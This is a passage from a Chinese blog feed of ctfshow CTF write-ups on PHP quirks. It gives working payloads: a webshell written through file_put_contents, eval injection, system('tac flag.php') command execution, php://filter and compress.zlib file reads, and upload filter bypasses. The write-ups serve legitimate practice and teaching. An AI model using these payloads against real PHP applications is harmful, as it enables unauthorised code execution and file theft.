class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'8'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'9'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">':'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//UVWXYZ</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token variable\">$l</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//ABCDEFG</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token variable\">$m</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//HIJKLMN</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token variable\">$n</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\t'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//OPQRST</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$o</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//UVWXYZ</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$A</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$A</span> <span class=\"token operator\">&lt;=</span> <span class=\"token string single-quoted-string\">'o'</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$A</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$$A</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">PHP_EOL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure></li>\n</ol>\n</li>\n</ul>\n<p>web161  <code>content-type</code>  为 <code>png</code> ，文件头为 <code>GIF89a</code>  绕过</p>\n<p>web166 上传 zip，然后输入一句话</p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/98069c85/",
            "url": "http://dpm12345.cn/posts/98069c85/",
            "title": "php 特性",
            "date_published": "2022-10-04T14:12:40.000Z",
            "content_html": "<h1 id=\"web-98\"><a class=\"anchor\" href=\"#web-98\">#</a> web 98</h1>\n<p>根据源码，可知，当传入 get 参数时。会将 get 改为 post 参数（后面的 get 会变成 post，即 highlight_file () 的判断 get 参数时，会判断 post 参数下的值)</p>\n<p>所以说该题的解是，先随便传入一个 get 值，之后通过 post 传入 <code>HTTP_FLAG=flag</code></p>\n<h1 id=\"web-99\"><a class=\"anchor\" href=\"#web-99\">#</a> web 99</h1>\n<p>关键在于</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'n'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'n'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$allow</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'n'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'content'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>这题主要是运用了 <code>in_array()</code>  的弱类型匹配</p>\n<p>故可以写</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>?n=1.php</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>content=&lt;?php eval($GET[1]);?&gt;</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>1=systme('ls');</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>1=system('tac flag.php');</pre></td></tr></tbody></table></figure><h1 id=\"web-100\"><a class=\"anchor\" href=\"#web-100\">#</a> web 100</h1>\n<p><code>$v0 = is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</code></p>\n<p>这是一个赋值加逻辑语句，而赋值优先级大于逻辑，故 <code>v0</code>  首先被赋值，后进行逻辑判断</p>\n<p>故 <code>v0</code>  的值只与 <code>v1</code>  的值有关，而后面 <code>v2</code>  和 <code>v3</code>  可以任意选</p>\n<p>这里由于只有 <code>eval(\"$v2('ctfshow')$v3\");</code></p>\n<p>故采用 <code>var_dump</code>  函数打印，</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>payload1<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">?</span>v1<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>v2<span class=\"token operator\">=</span><span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ctfshow</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v3<span class=\"token operator\">=</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>payload2<span class=\"token punctuation\">:</span> <span class=\"token operator\">?</span>v1<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span>v2<span class=\"token operator\">=</span><span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&amp;</span>v3<span class=\"token operator\">=</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'ctfshow.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><h1 id=\"web-101\"><a class=\"anchor\" href=\"#web-101\">#</a> web 101</h1>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/%E5%9B%BE%E7%89%87/web101.png\" alt=\"\"></p>\n<p>改为这个</p>\n<p>利用反射机制</p>\n<p><code>?v1=1&amp;v2=echo new Reflectionclass&amp;v3=;</code></p>\n<h1 id=\"web-102\"><a class=\"anchor\" href=\"#web-102\">#</a> web 102</h1>\n<p>只有一种解，查看 wp 为</p>\n<p>对</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>&lt;?=`cat *`;</pre></td></tr></tbody></table></figure><p>base64 编码后，删去末尾 \"=\", 然后进行 hex 编码，可得到 <code>5044383959474e6864434171594473</code> ，恰好有 <code>e</code> ，可以用科学计数法绕过 <code>v2</code>  的数字判断，而 <code>v1</code>  可以传入 <code>hex2bin</code>  将十六进制转回 base64， <code>v3</code>  使用  <code>filter base64</code>  写入文件，</p>\n<p>payload</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>v2<span class=\"token operator\">=</span><span class=\"token number\">115044383959474e6864434171594473</span><span class=\"token operator\">&amp;</span>v3<span class=\"token operator\">=</span>php<span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/convert.base64-decode/resource=web102_2.php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>v1<span class=\"token operator\">=</span>hex2bin</pre></td></tr></tbody></table></figure><h1 id=\"web-103\"><a class=\"anchor\" href=\"#web-103\">#</a> web 103</h1>\n<p>同 web 102 做法</p>\n<h1 id=\"web-104\"><a class=\"anchor\" href=\"#web-104\">#</a> web 104</h1>\n<ol>\n<li>没有判断两值相同的情况，可分别赋一样的值得到 flag</li>\n<li>由于 shal 对数组类型数据不能处理，返回 false，因此也可以用数组绕过</li>\n<li></li>\n</ol>\n<h1 id=\"web-105\"><a class=\"anchor\" href=\"#web-105\">#</a> web 105</h1>\n<p>这题主要考虑对变量重新赋值的操作</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$error</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'你还想要flag嘛？'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$suces</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'既然你想要那给你吧！'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span> <span class=\"token operator\">=&gt;</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>        </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'error'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>                  </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"what are you doing?!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token variable\">$$key</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$$value</span><span class=\"token punctuation\">;</span>                   </pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span> <span class=\"token operator\">=&gt;</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>    </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$value</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>            </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"what are you doing?!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token variable\">$$key</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$$value</span><span class=\"token punctuation\">;</span>                  </pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$error</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"your are good\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$flag</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>   </pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$suces</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>对 <code>foreach()</code>  中的参数进行研究，对于传入的 GET 值，键对应 key，内容对应 value；</p>\n<p>而之后的 <code> $$key = $$val</code> , 则是对某一变量的重新赋值 (或者创建一个变量)</p>\n<p>如 如果传入 <code>?a=flag</code> , 那么  <code>$key=a``$value=flag</code> , 那么在进行  <code>$$key = $$value</code>  语句时，即 <code> $a = $flag</code></p>\n<p>那么 flag 值就传入了变量 a 中</p>\n<p>而对于第二个处理 POST 的 <code>foreach()</code>  也是一样的</p>\n<p>重要的是在之后的 if 判断语句，当 POST 传入的 flag 不等于原来的 flag 值时，将会输出 error 的值，而对于想要获取 flag 的我们来说，flag 是未知的，也就是说这句判断一定为 true，之后的语句一定会进入，即输出 error 的值</p>\n<p>由此，根据一开始的分析，我们可以设法使 error 的值变为 flag 的值</p>\n<p>对于 post 操作，由于对内容进行了判断，因此不能使用 post 进行把 flag 赋值到 error 的操作，因此只能通过 get 操作</p>\n<p>而通过对 GET 段代码判断，发现只过滤了 error 值，因此可以把 flag 赋值到某一变量中</p>\n<p>即对 get， <code>?变量名=flag</code></p>\n<p>之后的 post，需要将 flag 值赋值到 error 中，因此对 POST <code>error=变量名</code></p>\n<p>而之后对 POST flag 的判断，由于一定为 true，故输出 error 值，即 flag</p>\n<h1 id=\"web-106\"><a class=\"anchor\" href=\"#web-106\">#</a> web 106</h1>\n<p>对于 104 的源代码增添了对传入值的相等判断，那么使用数组绕过</p>\n<h1 id=\"web-107\"><a class=\"anchor\" href=\"#web-107\">#</a> web 107</h1>\n<p><code>parse_str(string $string , array &amp;$result ): void</code></p>\n<p>如果 string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里）。</p>\n<p>再由代码，只需传入包含 flag 赋值的 <code>v1</code> ，和 <code>MD5($v3)</code>  为传入的 flag 值</p>\n<p>payload</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>v3<span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>v1<span class=\"token operator\">=</span>flag<span class=\"token operator\">=</span>c4ca4238a0b923820dcc509a6f75849b</pre></td></tr></tbody></table></figure><h1 id=\"web-108\"><a class=\"anchor\" href=\"#web-108\">#</a> web 108</h1>\n<p>截断绕过</p>\n<p><code>?c=a%00778</code></p>\n<h1 id=\"web-109\"><a class=\"anchor\" href=\"#web-109\">#</a> web 109</h1>\n<p>关键在于 <code>eval(\"echo new $v1($v2());\");</code></p>\n<h2 id=\"解法一\"><a class=\"anchor\" href=\"#解法一\">#</a> 解法一</h2>\n<p>这里需要补充知识</p>\n<ol>\n<li>\n<p>如果一个变量的后面跟上 ()，那么会将值作为函数进行调用</p>\n<p>如  <code>$a = 'phpinfo';$a();</code></p>\n<p>相当于进行了 <code>phpinfo();</code></p>\n</li>\n<li>\n<p>类于对象魔术方法</p>\n<p>下列方法名被认为是魔术方法： __construct () 、 __destruct () 、 __call () 、 __callStatic () 、 __get () 、 __set () 、 __isset () 、 __unset () 、 __sleep () 、 __wakeup () 、 __serialize () 、 __unserialize () 、 __toString () 、 __invoke () 、 __set_state () 、 __clone () 、 <strong>debugInfo() 。</strong></p>\n<p>__而__toString () 方法用于一个类被当成字符串时应怎样回应。例如 <code>echo $obj;</code>  应该显示些什么。</p>\n<p>如以下代码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">test</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'test'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">te</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>将会输出 test</p>\n<p>这样可以采取该方法 <code>?v1=mysqli&amp;v2=system('ls')</code>  列出目录，之后 <code>?v1=mysqli&amp;v2=system('tac flag.php')</code>  读取文件</p>\n<p>或者可将 <code>mysqli</code>  换成 <code>exception</code>  类， <code>exception()</code> ，括号中的参数会将其作为 php 代码执行 (存疑，并不是这样)，不过滤</p>\n<p>因此 <code>?v1=exception&amp;v2=system('tac flag.php')</code>  也可</p>\n</li>\n</ol>\n<h2 id=\"解法二\"><a class=\"anchor\" href=\"#解法二\">#</a> 解法二</h2>\n<p>将 <code>v1</code>  改为 <code>reflectionclass</code></p>\n<p>实际上，经过尝试，对于大多数类都能这样</p>\n<p>但触发了 <code>echo new test(phpinfo());</code>  后，在之后的代码都不会执行 <mark>(具体原理不清楚)</mark></p>\n<p>大多数能够输出的原因 (猜测)：</p>\n<p>如果用 echo 输出一个类对象，那么输出结果由 <code> __toString()</code>  控制，而在高版本中， <code>__toString</code>  自动存在，其内容为 <code>print $value;</code> , 同时也可自己控制</p>\n<h1 id=\"web-110\"><a class=\"anchor\" href=\"#web-110\">#</a> web 110</h1>\n<p>过滤了各种字符，采用 <code>FilesystemIterator</code> ，参数写 <code>getcwd</code> ， <code>getcwd</code>  用来取得当前工作目录， 两个连用后返回第一个名字</p>\n<h1 id=\"web-111\"><a class=\"anchor\" href=\"#web-111\">#</a> web 111</h1>\n<p>采用超全局变量 GLOBALS，获取全局作用域下的可用的全部变量</p>\n<h1 id=\"web-112\"><a class=\"anchor\" href=\"#web-112\">#</a> web 112</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>file<span class=\"token operator\">=</span>php<span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/resource=flag.php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">?</span>file<span class=\"token operator\">=</span>php<span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/convert.base32-encode/resource=flag.php// 当然 base32 等其他的 base 系列都是可以的，或者其他的编码形式</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">?</span>file<span class=\"token operator\">=</span>php<span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/read=convert.quoted-printable-encode/resource=flag.php</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">?</span>file<span class=\"token operator\">=</span>compress<span class=\"token operator\">.</span>zlib<span class=\"token punctuation\">:</span><span class=\"token comment\">//flag.php</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">?</span>file<span class=\"token operator\">=</span>php<span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php</span></pre></td></tr></tbody></table></figure><h1 id=\"web-113\"><a class=\"anchor\" href=\"#web-113\">#</a> web 113</h1>\n<p><code>is_file()</code>  也支持一些包装器和伪协议，返回的值为 false</p>\n<h2 id=\"解法一-2\"><a class=\"anchor\" href=\"#解法一-2\">#</a> 解法一</h2>\n<p>过滤器被过滤，使用压缩流 <code>?file=compress.zlib://flag.php</code></p>\n<h2 id=\"解法二-2\"><a class=\"anchor\" href=\"#解法二-2\">#</a> 解法二</h2>\n<p>linux 里 <code>/proc/self/root</code>  是指向根目录的，也就是如果在命令行中输入 <code>ls /proc/self/root</code> ，其实显示的内容是根目录下的内容多次重复后绕过 <code>is_file</code></p>\n<p>使用脚本跑，得到 payload</p>\n<h1 id=\"web-114\"><a class=\"anchor\" href=\"#web-114\">#</a> web 114</h1>\n<p>filter</p>\n<h1 id=\"web-115\"><a class=\"anchor\" href=\"#web-115\">#</a> web 115</h1>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span 